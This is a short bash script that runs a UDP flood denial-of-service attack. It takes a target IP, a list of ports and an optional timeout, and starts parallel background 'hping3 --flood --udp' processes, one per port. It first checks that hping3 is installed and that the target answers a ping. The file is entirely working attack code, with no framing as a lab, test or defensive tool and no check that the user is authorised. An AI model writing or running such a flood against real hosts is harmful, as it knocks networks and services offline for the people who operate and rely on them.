#!/bin/bash

FLOOD_TARGET_IP="${1}"
FLOOD_UDP_PORTS_STR="${2}"
FLOOD_TIMEOUT_SEC="${3}"

CLR_RED="\033[0;31m"
CLR_NONE="\033[0m"

# These get redefined later...
FLOOD_UDP_PORTS_ARR=""
FLOOD_CMD=""

DEPENDENCIES=(
    "hping3"
)

# Helpers
_log() {
    echo -e ${0##*/}: "${@}" 1>&2
}

_die() {
    _log "${CLR_RED}FATAL:${CLR_NONE} ${@}"
    exit 1
}

if [ -z "${FLOOD_TARGET_IP}" -o -z "${FLOOD_UDP_PORTS_STR}" ]; then
    _die "Missing first or second argument. Must specify TARGET IP and UDP PORTS."
fi

# Check if dependencies are installed
for PROGRAM in "${DEPENDENCIES[@]}"
do
    command -v "${PROGRAM}" >/dev/null 2>&1 || {
        _die "${PROGRAM} is not installed."
    }
done

# Split string into array
IFS=',' read -r -a FLOOD_UDP_PORTS_ARR <<< "$FLOOD_UDP_PORTS_STR"

# Validate TARGET IP is accessible
ping -c 1 "${FLOOD_TARGET_IP}" >/dev/null 2>&1
if [ $? -ne 0 ]; then
    _die "Unable to ping ${FLOOD_TARGET_IP}. Does the host exist?"
fi

# TODO: Validate FLOOD_TIMEOUT_SEC and FLOOD_UDP_PORTS_ARR are numbers
for PORT in "${FLOOD_UDP_PORTS_ARR[@]}"
do
    FLOOD_CMD="hping3 --flood --udp -p ${PORT} ${FLOOD_TARGET_IP}"
    if [ -n "${FLOOD_TIMEOUT_SEC}" ]; then
        timeout ${FLOOD_TIMEOUT_SEC} ${FLOOD_CMD} &
    else
        ${FLOOD_CMD} &
    fi
done

wait
